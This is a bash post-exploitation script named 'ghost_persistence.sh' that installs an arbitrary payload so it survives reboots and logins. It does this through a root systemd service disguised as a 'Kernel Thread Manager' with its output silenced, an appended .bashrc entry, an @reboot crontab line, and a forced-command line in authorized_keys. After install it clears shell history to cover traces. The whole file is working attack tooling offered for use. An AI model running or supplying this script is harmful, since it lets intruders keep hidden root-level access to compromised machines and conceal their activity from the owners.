#!/bin/bash

# Stealthy Linux Persistence with Multiple Methods
# Usage: ./ghost_persistence.sh [install|remove] [payload_path]

# Configuration
PAYLOAD="$2"
STEALTH_NAME=".kernel_thread"
BACKUP_NAME=".bashrc_backup"

# Systemd service persistence
install_systemd() {
    cat > /etc/systemd/system/$STEALTH_NAME.service <<EOF
[Unit]
Description=Kernel Thread Manager

[Service]
ExecStart=$PAYLOAD
Restart=always
RestartSec=60
User=root
Group=root
RemainAfterExit=yes
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable $STEALTH_NAME.service
    systemctl start $STEALTH_NAME.service
}

remove_systemd() {
    systemctl stop $STEALTH_NAME.service
    systemctl disable $STEALTH_NAME.service
    rm -f /etc/systemd/system/$STEALTH_NAME.service
    systemctl daemon-reload
}

# Bashrc persistence
install_bashrc() {
    cp ~/.bashrc ~/$BACKUP_NAME
    echo "if [ -x \"$PAYLOAD\" ]; then" >> ~/.bashrc
    echo "    $PAYLOAD &" >> ~/.bashrc
    echo "fi" >> ~/.bashrc
}

remove_bashrc() {
    [ -f ~/$BACKUP_NAME ] && mv ~/$BACKUP_NAME ~/.bashrc
}

# Crontab persistence
install_cron() {
    (crontab -l 2>/dev/null; echo "@reboot $PAYLOAD") | crontab -
}

remove_cron() {
    crontab -l | grep -v "@reboot $PAYLOAD" | crontab -
}

# SSH authorized_keys command hijacking
install_ssh() {
    if [ ! -f ~/.ssh/authorized_keys ]; then
        mkdir -p ~/.ssh
        touch ~/.ssh/authorized_keys
        chmod 600 ~/.ssh/authorized_keys
    fi
    
    # Add hijacked key
    echo -n 'command="'$PAYLOAD'",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ' >> ~/.ssh/authorized_keys
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD..." >> ~/.ssh/authorized_keys
}

remove_ssh() {
    sed -i '\|command="'$PAYLOAD'",no-port-forwarding,no-X11-forwarding,no-agent-forwarding|d' ~/.ssh/authorized_keys
}

# Main logic
case "$1" in
    install)
        install_systemd
        install_bashrc
        install_cron
        install_ssh
        echo "Persistence installed successfully"
        ;;
    remove)
        remove_systemd
        remove_bashrc
        remove_cron
        remove_ssh
        echo "Persistence removed"
        ;;
    *)
        echo "Usage: $0 [install|remove] [payload_path]"
        exit 1
        ;;
esac

# Cleanup traces
history -c
rm -f ~/.bash_history